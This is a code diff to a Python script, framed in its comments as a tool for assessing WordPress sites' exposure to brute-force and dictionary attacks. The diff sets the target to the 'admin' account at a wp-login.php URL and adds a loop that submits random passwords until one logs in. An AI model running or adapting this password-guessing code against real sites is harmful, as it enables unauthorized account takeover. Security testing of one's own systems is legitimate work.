@@ -5,10 +5,10 @@ import random
 # This is a tool intended to assess vulnerabilities to brute-force and dictionary attacks in Wordpress
 # Assumes the username is known
 
-wp_url = "https://www.example.com/"
+wp_url = "https://example.com/"
 wp_url += "wp-login.php" # change if needed
 
-wp_user = "user@example.com" # set this to the account you are targeting
+wp_user = "admin" # set this to the account you are targeting
 
 wp_passwd = "" # holds password value, if needed
 
@@ -73,6 +73,17 @@ def test_brute_force():
     max_length = 8
     charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
+    while 1:
+        print(count)
+        passwd = make_random_password(min_length, max_length, charset)
+        if make_request(passwd) == True:
+            break
+        else:
+            count+=1
+    print("It took {0} attempts to crack the password with a brute force attack.".format(count))
+
     pass
 
+
 test_dictionary()
+# test_brute_force()
